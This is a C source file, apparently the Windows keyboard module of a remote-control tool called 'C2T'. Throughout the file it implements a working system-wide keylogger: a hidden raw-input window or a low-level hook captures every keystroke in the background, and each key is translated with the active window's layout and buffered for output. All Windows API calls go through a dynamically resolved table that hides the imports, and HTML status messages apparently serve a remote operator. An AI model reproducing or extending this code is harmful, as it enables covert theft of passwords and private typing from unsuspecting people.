/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "../logging/logging.h"
#include "../runtime/runtime.h"
#include "keyboard.h"
#include "keyboard_output.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

static HANDLE listener_thread;
static DWORD listener_thread_id;
static int listener_started;
static volatile int stopping;

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
static HHOOK keyboard_hook;
#else
static HWND raw_input_hwnd;
static const wchar_t RAW_INPUT_CLASS_NAME[] = L"C2T_RawInputListenerWindow";
#endif

#include "../win32/win32_api.h"

static DWORD c2t_GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetWindowThreadProcessId)
    return g_c2t_win32.GetWindowThreadProcessId(hWnd, lpdwProcessId);
  return 0;
}

static SHORT c2t_GetAsyncKeyState(int vKey) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetAsyncKeyState)
    return g_c2t_win32.GetAsyncKeyState(vKey);
  return 0;
}
[[maybe_unused]] static SHORT c2t_VkKeyScanW(WCHAR ch) {
  c2t_win32_api_init();
  if (g_c2t_win32.VkKeyScanW)
    return g_c2t_win32.VkKeyScanW(ch);
  return 0;
}
[[maybe_unused]] static UINT c2t_MapVirtualKeyW(UINT uCode, UINT uMapType) {
  c2t_win32_api_init();
  if (g_c2t_win32.MapVirtualKeyW)
    return g_c2t_win32.MapVirtualKeyW(uCode, uMapType);
  return 0;
}
static int c2t_WideCharToMultiByte(UINT CodePage, DWORD dwFlags,
                                   LPCWCH lpWideCharStr, int cchWideChar,
                                   LPSTR lpMultiByteStr, int cbMultiByte,
                                   LPCCH lpDefaultChar,
                                   LPBOOL lpUsedDefaultChar) {
  c2t_win32_api_init();
  if (g_c2t_win32.WideCharToMultiByte)
    return g_c2t_win32.WideCharToMultiByte(
        CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr,
        cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
  return 0;
}
static HWND c2t_GetForegroundWindow(VOID) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetForegroundWindow)
    return g_c2t_win32.GetForegroundWindow();
  return NULL;
}
[[maybe_unused]] static int c2t_GetWindowTextW(HWND hWnd, LPWSTR lpString,
                                                int nMaxCount) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetWindowTextW)
    return g_c2t_win32.GetWindowTextW(hWnd, lpString, nMaxCount);
  return 0;
}
[[maybe_unused]] static LRESULT c2t_CallNextHookEx(HHOOK hhk, int nCode,
                                                   WPARAM wParam,
                                                   LPARAM lParam) {
  c2t_win32_api_init();
  if (g_c2t_win32.CallNextHookEx)
    return g_c2t_win32.CallNextHookEx(hhk, nCode, wParam, lParam);
  return 0;
}
static UINT c2t_GetRawInputData(HRAWINPUT hRawInput, UINT uiCommand,
                                LPVOID pData, PUINT pcbSize,
                                UINT cbSizeHeader) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetRawInputData)
    return g_c2t_win32.GetRawInputData(hRawInput, uiCommand, pData, pcbSize,
                                       cbSizeHeader);
  return (UINT)-1;
}
static LRESULT c2t_DefWindowProcW(HWND hWnd, UINT Msg, WPARAM wParam,
                                 LPARAM lParam) {
  c2t_win32_api_init();
  if (g_c2t_win32.DefWindowProcW)
    return g_c2t_win32.DefWindowProcW(hWnd, Msg, wParam, lParam);
  return 0;
}
[[maybe_unused]] static HHOOK c2t_SetWindowsHookExW(int idHook, HOOKPROC lpfn,
                                                    HINSTANCE hmod,
                                                    DWORD dwThreadId) {
  c2t_win32_api_init();
  if (g_c2t_win32.SetWindowsHookExW)
    return g_c2t_win32.SetWindowsHookExW(idHook, lpfn, hmod, dwThreadId);
  return NULL;
}
static HMODULE c2t_GetModuleHandleW(LPCWSTR lpModuleName) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetModuleHandleW)
    return g_c2t_win32.GetModuleHandleW(lpModuleName);
  return NULL;
}
static HWND c2t_CreateWindowExW(DWORD dwExStyle, LPCWSTR lpClassName,
                                LPCWSTR lpWindowName, DWORD dwStyle, int X,
                                int Y, int nWidth, int nHeight, HWND hWndParent,
                                HMENU hMenu, HINSTANCE hInstance,
                                LPVOID lpParam) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateWindowExW)
    return g_c2t_win32.CreateWindowExW(dwExStyle, lpClassName, lpWindowName,
                                       dwStyle, X, Y, nWidth, nHeight,
                                       hWndParent, hMenu, hInstance, lpParam);
  return NULL;
}
static BOOL c2t_UnregisterClassW(LPCWSTR lpClassName, HINSTANCE hInstance) {
  c2t_win32_api_init();
  if (g_c2t_win32.UnregisterClassW)
    return g_c2t_win32.UnregisterClassW(lpClassName, hInstance);
  return FALSE;
}
static BOOL c2t_RegisterRawInputDevices(PCRAWINPUTDEVICE pRawInputDevices,
                                         UINT uiNumDevices, UINT cbSize) {
  c2t_win32_api_init();
  if (g_c2t_win32.RegisterRawInputDevices)
    return g_c2t_win32.RegisterRawInputDevices(pRawInputDevices, uiNumDevices,
                                               cbSize);
  return FALSE;
}
static BOOL c2t_DestroyWindow(HWND hWnd) {
  c2t_win32_api_init();
  if (g_c2t_win32.DestroyWindow)
    return g_c2t_win32.DestroyWindow(hWnd);
  return FALSE;
}
static BOOL c2t_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax, UINT wRemoveMsg) {
  c2t_win32_api_init();
  if (g_c2t_win32.PeekMessageW)
    return g_c2t_win32.PeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax,
                                   wRemoveMsg);
  return FALSE;
}
static BOOL c2t_TranslateMessage(const MSG *lpMsg) {
  c2t_win32_api_init();
  if (g_c2t_win32.TranslateMessage)
    return g_c2t_win32.TranslateMessage(lpMsg);
  return FALSE;
}
static LRESULT c2t_DispatchMessageW(const MSG *lpMsg) {
  c2t_win32_api_init();
  if (g_c2t_win32.DispatchMessageW)
    return g_c2t_win32.DispatchMessageW(lpMsg);
  return 0;
}
[[maybe_unused]] static BOOL c2t_UnhookWindowsHookEx(HHOOK hhk) {
  c2t_win32_api_init();
  if (g_c2t_win32.UnhookWindowsHookEx)
    return g_c2t_win32.UnhookWindowsHookEx(hhk);
  return FALSE;
}
static BOOL c2t_PostThreadMessageW(DWORD idThread, UINT Msg, WPARAM wParam,
                                   LPARAM lParam) {
  c2t_win32_api_init();
  if (g_c2t_win32.PostThreadMessageW)
    return g_c2t_win32.PostThreadMessageW(idThread, Msg, wParam, lParam);
  return FALSE;
}
static DWORD c2t_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.WaitForSingleObject)
    return g_c2t_win32.WaitForSingleObject(hHandle, dwMilliseconds);
  return WAIT_FAILED;
}
static BOOL c2t_CloseHandle(HANDLE hObject) {
  c2t_win32_api_init();
  if (g_c2t_win32.CloseHandle)
    return g_c2t_win32.CloseHandle(hObject);
  return FALSE;
}
static HKL c2t_GetKeyboardLayout(DWORD idThread) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetKeyboardLayout)
    return g_c2t_win32.GetKeyboardLayout(idThread);
  return NULL;
}
static SHORT c2t_GetKeyState(int nVirtKey) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetKeyState)
    return g_c2t_win32.GetKeyState(nVirtKey);
  return 0;
}
static int c2t_ToUnicodeEx(UINT wVirtKey, UINT wScanCode, const BYTE *lpKeyState,
                           LPWSTR pwszBuff, int cchBuff, UINT wFlags,
                           HKL dwhkl) {
  c2t_win32_api_init();
  if (g_c2t_win32.ToUnicodeEx)
    return g_c2t_win32.ToUnicodeEx(wVirtKey, wScanCode, lpKeyState, pwszBuff,
                                   cchBuff, wFlags, dwhkl);
  return 0;
}
static ATOM c2t_RegisterClassExW(const WNDCLASSEXW *lpWndClassEx) {
  c2t_win32_api_init();
  if (g_c2t_win32.RegisterClassExW)
    return g_c2t_win32.RegisterClassExW(lpWndClassEx);
  return 0;
}
static DWORD c2t_MsgWaitForMultipleObjects(DWORD nCount, const HANDLE *pHandles,
                                           BOOL bWaitAll, DWORD dwMilliseconds,
                                           DWORD dwWakeMask) {
  c2t_win32_api_init();
  if (g_c2t_win32.MsgWaitForMultipleObjects)
    return g_c2t_win32.MsgWaitForMultipleObjects(
        nCount, pHandles, bWaitAll, dwMilliseconds, dwWakeMask);
  return WAIT_FAILED;
}
static HANDLE c2t_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
                               SIZE_T dwStackSize,
                               LPTHREAD_START_ROUTINE lpStartAddress,
                               LPVOID lpParameter, DWORD dwCreationFlags,
                               LPDWORD lpThreadId) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateThread)
    return g_c2t_win32.CreateThread(lpThreadAttributes, dwStackSize,
                                    lpStartAddress, lpParameter,
                                    dwCreationFlags, lpThreadId);
  return NULL;
}
static DWORD c2t_GetCurrentThreadId(VOID) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetCurrentThreadId)
    return g_c2t_win32.GetCurrentThreadId();
  return 0;
}
static int c2t_GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData,
                              int cchData) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetLocaleInfoA)
    return g_c2t_win32.GetLocaleInfoA(Locale, LCType, lpLCData, cchData);
  return 0;
}

static DWORD c2t_GetLastError(VOID) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetLastError)
    return g_c2t_win32.GetLastError();
  return 0;
}

#define GetAsyncKeyState c2t_GetAsyncKeyState
#define VkKeyScanW c2t_VkKeyScanW
#define MapVirtualKeyW c2t_MapVirtualKeyW
#define WideCharToMultiByte c2t_WideCharToMultiByte
#define GetForegroundWindow c2t_GetForegroundWindow
#define GetWindowTextW c2t_GetWindowTextW
#define CallNextHookEx c2t_CallNextHookEx
#define GetRawInputData c2t_GetRawInputData
#define DefWindowProcW c2t_DefWindowProcW
#define SetWindowsHookExW c2t_SetWindowsHookExW
#define GetModuleHandleW c2t_GetModuleHandleW
#define CreateWindowExW c2t_CreateWindowExW
#define UnregisterClassW c2t_UnregisterClassW
#define RegisterRawInputDevices c2t_RegisterRawInputDevices
#define DestroyWindow c2t_DestroyWindow
#define PeekMessageW c2t_PeekMessageW
#define TranslateMessage c2t_TranslateMessage
#define DispatchMessageW c2t_DispatchMessageW
#define UnhookWindowsHookEx c2t_UnhookWindowsHookEx
#define PostThreadMessageW c2t_PostThreadMessageW
#define WaitForSingleObject c2t_WaitForSingleObject
#define CloseHandle c2t_CloseHandle
#define GetKeyboardLayout c2t_GetKeyboardLayout
#define GetKeyState c2t_GetKeyState
#define ToUnicodeEx c2t_ToUnicodeEx
#define RegisterClassExW c2t_RegisterClassExW
#define MsgWaitForMultipleObjects c2t_MsgWaitForMultipleObjects
#define CreateThread c2t_CreateThread
#define GetCurrentThreadId c2t_GetCurrentThreadId
#define GetLocaleInfoA c2t_GetLocaleInfoA
#define GetLastError c2t_GetLastError

static void process_windows_key_event(DWORD vk, DWORD scan_code,
                                      [[maybe_unused]] int is_extended) {
  if (vk == 0 || vk == 255)
    return;

  /* Ignore standalone modifier keydown events so they don't produce empty
   * labels */
  if (vk == VK_LCONTROL || vk == VK_RCONTROL || vk == VK_CONTROL ||
      vk == VK_LMENU || vk == VK_RMENU || vk == VK_MENU || vk == VK_LSHIFT ||
      vk == VK_RSHIFT || vk == VK_SHIFT || vk == VK_LWIN || vk == VK_RWIN) {
    return;
  }

  int ctrl_down = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
  int shift_down = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
  int alt_down = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
  int win_down = (GetAsyncKeyState(VK_LWIN) & 0x8000) != 0 ||
                 (GetAsyncKeyState(VK_RWIN) & 0x8000) != 0;

  char key_label[64] = {0};
  int is_special = 0;
  int is_printable = 0;

  if (vk >= VK_F1 && vk <= VK_F24) {
    snprintf(key_label, sizeof(key_label), "F%lu",
             (unsigned long)(vk - VK_F1 + 1));
    is_special = 1;
  } else {
    switch (vk) {
    case VK_RETURN:
      key_label[0] = '\n';
      key_label[1] = '\0';
      is_printable = 1;
      break;
    case VK_SPACE:
      key_label[0] = ' ';
      key_label[1] = '\0';
      is_printable = 1;
      break;
    case VK_TAB:
      key_label[0] = '\t';
      key_label[1] = '\0';
      is_printable = 1;
      break;
    case VK_BACK:
      keyboard_output_backspace();
      break;
    case VK_ESCAPE:
      snprintf(key_label, sizeof(key_label), "ESC");
      is_special = 1;
      break;
    case VK_DELETE:
      snprintf(key_label, sizeof(key_label), "Del");
      is_special = 1;
      break;
    case VK_INSERT:
      snprintf(key_label, sizeof(key_label), "Ins");
      is_special = 1;
      break;
    case VK_HOME:
      snprintf(key_label, sizeof(key_label), "Home");
      is_special = 1;
      break;
    case VK_END:
      snprintf(key_label, sizeof(key_label), "End");
      is_special = 1;
      break;
    case VK_PRIOR:
      snprintf(key_label, sizeof(key_label), "PgUp");
      is_special = 1;
      break;
    case VK_NEXT:
      snprintf(key_label, sizeof(key_label), "PgDn");
      is_special = 1;
      break;
    case VK_LEFT:
      snprintf(key_label, sizeof(key_label), "Left");
      is_special = 1;
      break;
    case VK_UP:
      snprintf(key_label, sizeof(key_label), "Up");
      is_special = 1;
      break;
    case VK_RIGHT:
      snprintf(key_label, sizeof(key_label), "Right");
      is_special = 1;
      break;
    case VK_DOWN:
      snprintf(key_label, sizeof(key_label), "Down");
      is_special = 1;
      break;
    case VK_SNAPSHOT:
      snprintf(key_label, sizeof(key_label), "PrtScn");
      is_special = 1;
      break;
    case VK_PAUSE:
      snprintf(key_label, sizeof(key_label), "Pause");
      is_special = 1;
      break;
    case VK_SCROLL:
      snprintf(key_label, sizeof(key_label), "ScrollLock");
      is_special = 1;
      break;
    case VK_NUMLOCK:
      snprintf(key_label, sizeof(key_label), "NumLock");
      is_special = 1;
      break;
    default: {
      BYTE key_state[256] = {0};
      if (shift_down)
        key_state[VK_SHIFT] = 0x80;
      if (ctrl_down)
        key_state[VK_CONTROL] = 0x80;
      if (alt_down)
        key_state[VK_MENU] = 0x80;
      if (GetKeyState(VK_CAPITAL) & 0x0001)
        key_state[VK_CAPITAL] = 0x01;

      static HWND cached_fg_wnd = nullptr;
      static DWORD cached_fg_thread = 0;
      static HKL cached_hkl = nullptr;

      HWND fg_wnd = GetForegroundWindow();
      if (fg_wnd != cached_fg_wnd) {
        cached_fg_wnd = fg_wnd;
        cached_fg_thread =
            fg_wnd ? c2t_GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
        cached_hkl = cached_fg_thread ? c2t_GetKeyboardLayout(cached_fg_thread)
                                      : c2t_GetKeyboardLayout(0);
      }
      HKL hkl = cached_hkl;

      WCHAR unicode_buf[8] = {0};
      int count = ToUnicodeEx(vk, scan_code, key_state, unicode_buf, 4, 0, hkl);
      if (count > 0) {
        int utf8_bytes =
            WideCharToMultiByte(CP_UTF8, 0, unicode_buf, count, key_label,
                                sizeof(key_label) - 1, nullptr, nullptr);
        if (utf8_bytes > 0) {
          key_label[utf8_bytes] = '\0';
          is_printable = 1;
        }
      }
      break;
    }
    }
  }

  if (is_special || is_printable) {
    int is_altgr =
        (ctrl_down && alt_down) || ((GetAsyncKeyState(VK_RMENU) & 0x8000) != 0);
    int has_modifier =
        (ctrl_down && !is_altgr) || (alt_down && !is_altgr) || win_down;
    if (has_modifier && key_label[0] != '\n') {
      if (keyboard_get_shortcuts_enabled()) {
        char mod_buf[96];
        int offset = snprintf(mod_buf, sizeof(mod_buf), "[");
        if (ctrl_down)
          offset +=
              snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Ctrl+");
        if (alt_down)
          offset +=
              snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Alt+");
        if (win_down)
          offset +=
              snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Win+");
        if (shift_down && !is_printable)
          offset +=
              snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "Shift+");
        offset += snprintf(mod_buf + offset, sizeof(mod_buf) - offset, "%s]",
                           key_label);
        if (offset > 0 && (size_t)offset < sizeof(mod_buf)) {
          keyboard_output_append(mod_buf, (size_t)offset);
        }
      }
    } else if (is_special) {
      if (keyboard_get_shortcuts_enabled()) {
        char spec_buf[48];
        int spec_len = snprintf(spec_buf, sizeof(spec_buf), "[%s]", key_label);
        if (spec_len > 0) {
          keyboard_output_append(spec_buf, (size_t)spec_len);
        }
      }
    } else if (is_printable) {
      keyboard_output_append(key_label, strlen(key_label));
    }
  }
}

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam,
                                             LPARAM lParam) {
  if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
    KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
    process_windows_key_event(kbd->vkCode, kbd->scanCode,
                              (kbd->flags & LLKHF_EXTENDED) != 0);
  }
  return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}
#else
static LRESULT CALLBACK RawInputWndProc(HWND hwnd, UINT uMsg, WPARAM wParam,
                                        LPARAM lParam) {
  if (uMsg == WM_INPUT) {
    UINT dwSize = 0;
    if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, nullptr, &dwSize,
                        sizeof(RAWINPUTHEADER)) == 0 &&
        dwSize > 0) {
      BYTE stack_buf[256];
      BYTE *buf =
          (dwSize <= sizeof(stack_buf)) ? stack_buf : (BYTE *)malloc(dwSize);
      if (buf) {
        if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buf, &dwSize,
                            sizeof(RAWINPUTHEADER)) == dwSize) {
          RAWINPUT *raw = (RAWINPUT *)buf;
          if (raw->header.dwType == RIM_TYPEKEYBOARD) {
            RAWKEYBOARD *kb = &raw->data.keyboard;
            if ((kb->Flags & RI_KEY_BREAK) == 0) {
              process_windows_key_event(kb->VKey, kb->MakeCode,
                                        (kb->Flags & RI_KEY_E0) != 0);
            }
          }
        }
        if (buf != stack_buf) {
          free(buf);
        }
      }
    }
    return DefWindowProcW(hwnd, uMsg, wParam, lParam);
  }
  return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}
#endif

static DWORD WINAPI listener_worker([[maybe_unused]] void *context) {
  listener_thread_id = GetCurrentThreadId();

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
  keyboard_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                    GetModuleHandleW(nullptr), 0);
  if (!keyboard_hook) {
    c2t_log_error("keyboard", "SetWindowsHookExW failed (error %lu)",
                  GetLastError());
    return 1;
  }
  c2t_log_info("keyboard", "Windows low-level keyboard hook active (legacy)");
#else
  HINSTANCE hInst = GetModuleHandleW(nullptr);
  WNDCLASSEXW wc = {0};
  wc.cbSize = sizeof(WNDCLASSEXW);
  wc.lpfnWndProc = RawInputWndProc;
  wc.hInstance = hInst;
  wc.lpszClassName = RAW_INPUT_CLASS_NAME;
  (void)RegisterClassExW(&wc);

  raw_input_hwnd =
      CreateWindowExW(0, RAW_INPUT_CLASS_NAME, L"C2T_RawInput", 0, 0, 0, 0, 0,
                      HWND_MESSAGE, nullptr, hInst, nullptr);
  if (!raw_input_hwnd) {
    c2t_log_error("keyboard",
                  "CreateWindowExW (HWND_MESSAGE) failed (error %lu)",
                  GetLastError());
    UnregisterClassW(RAW_INPUT_CLASS_NAME, hInst);
    return 1;
  }

  RAWINPUTDEVICE rid = {0};
  rid.usUsagePage = 0x01; /* HID_USAGE_PAGE_GENERIC */
  rid.usUsage = 0x06;     /* HID_USAGE_GENERIC_KEYBOARD */
  rid.dwFlags = RIDEV_INPUTSINK;
  rid.hwndTarget = raw_input_hwnd;

  if (!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE))) {
    c2t_log_error("keyboard", "RegisterRawInputDevices failed (error %lu)",
                  GetLastError());
    DestroyWindow(raw_input_hwnd);
    raw_input_hwnd = nullptr;
    UnregisterClassW(RAW_INPUT_CLASS_NAME, hInst);
    return 1;
  }
  c2t_log_info("keyboard",
               "Windows Raw Input keyboard listener active (RIDEV_INPUTSINK)");
#endif

  MSG msg;
  while (!stopping && !c2t_runtime_stop_requested()) {
    BOOL res = PeekMessageW(&msg, nullptr, 0, 0, PM_REMOVE);
    if (res > 0) {
      if (msg.message == WM_QUIT)
        break;
      TranslateMessage(&msg);
      DispatchMessageW(&msg);
    } else {
      MsgWaitForMultipleObjects(0, nullptr, FALSE, 200, QS_ALLINPUT);
    }
  }

#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
  if (keyboard_hook) {
    UnhookWindowsHookEx(keyboard_hook);
    keyboard_hook = nullptr;
  }
#else
  RAWINPUTDEVICE rid_remove = {0};
  rid_remove.usUsagePage = 0x01;
  rid_remove.usUsage = 0x06;
  rid_remove.dwFlags = RIDEV_REMOVE;
  rid_remove.hwndTarget = nullptr;
  RegisterRawInputDevices(&rid_remove, 1, sizeof(RAWINPUTDEVICE));

  if (raw_input_hwnd) {
    DestroyWindow(raw_input_hwnd);
    raw_input_hwnd = nullptr;
  }
  UnregisterClassW(RAW_INPUT_CLASS_NAME, hInst);
#endif

  keyboard_output_flush();
  return 0;
}

int keyboard_listen(void) { return (int)listener_worker(nullptr); }

int keyboard_listener_init(void) {
  if (listener_started)
    return 1;

  stopping = 0;
  listener_thread = CreateThread(nullptr, 0, listener_worker, nullptr, 0,
                                 &listener_thread_id);
  listener_started = (listener_thread != nullptr);

  if (!listener_started) {
    c2t_log_error("keyboard",
                  "Unable to start Windows keyboard listener thread");
  }
  return listener_started;
}

void keyboard_listener_cleanup(void) {
  if (!listener_started)
    return;

  stopping = 1;
  if (listener_thread_id != 0) {
    PostThreadMessageW(listener_thread_id, WM_QUIT, 0, 0);
  }
  WaitForSingleObject(listener_thread, INFINITE);
  CloseHandle(listener_thread);
  listener_started = 0;
}

static char windows_selected_target[128] = "all";

int keyboard_get_device_list(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0)
    return 0;
#ifdef C2T_USE_LEGACY_KEYBOARD_HOOK
  const char *backend = "WH_KEYBOARD_LL (Legacy Windows Hook)";
#else
  const char *backend = "Raw Input (RegisterRawInputDevices, RIDEV_INPUTSINK)";
#endif
  snprintf(buffer, max_len,
           "⌨️ <b>Windows Keyboard Devices:</b>\n\n"
           "• <b>[0]</b> <code>%s</code> — 🟢 <b>ACTIVE</b>\n\n"
           "🎯 <b>Current Target:</b> <code>%s</code>",
           backend, windows_selected_target);
  return 1;
}

int keyboard_select_device(const char *target) {
  if (!target || !*target || strcmp(target, "all") == 0 ||
      strcmp(target, "*") == 0) {
    snprintf(windows_selected_target, sizeof(windows_selected_target), "all");
  } else {
    snprintf(windows_selected_target, sizeof(windows_selected_target), "%s",
             target);
  }
  return 1;
}

void keyboard_get_selected_target(char *buffer, size_t max_len) {
  if (buffer && max_len > 0) {
    snprintf(buffer, max_len, "%s", windows_selected_target);
  }
}

int keyboard_get_device_count(void) { return 1; }

int keyboard_set_layout([[maybe_unused]] const char *layout_name) {
  /* On Windows, layout is tracked automatically per active window via
   * ToUnicodeEx */
  return 1;
}

void keyboard_get_layout(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0)
    return;
  HWND fg_wnd = GetForegroundWindow();
  DWORD fg_thread = fg_wnd ? c2t_GetWindowThreadProcessId(fg_wnd, nullptr) : 0;
  HKL hkl =
      fg_thread ? c2t_GetKeyboardLayout(fg_thread) : c2t_GetKeyboardLayout(0);
  unsigned short lang_id = (unsigned short)((uintptr_t)hkl & 0xFFFF);
  char lang_name[128] = {0};
  if (GetLocaleInfoA(MAKELCID(lang_id, SORT_DEFAULT), LOCALE_SLANGUAGE,
                     lang_name, sizeof(lang_name)) > 0) {
    snprintf(buffer, max_len, "🪟 Windows Native (%s, 0x%04X)", lang_name,
             lang_id);
  } else {
    snprintf(buffer, max_len, "🪟 Windows Native (Auto, 0x%04X)", lang_id);
  }
}

void keyboard_get_available_layouts(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0)
    return;
  snprintf(buffer, max_len,
           "🌐 <b>Windows Keyboard Layout:</b>\n"
           "• Windows automatically maps keystrokes using the active "
           "application's layout in real-time.\n");
}
#endif
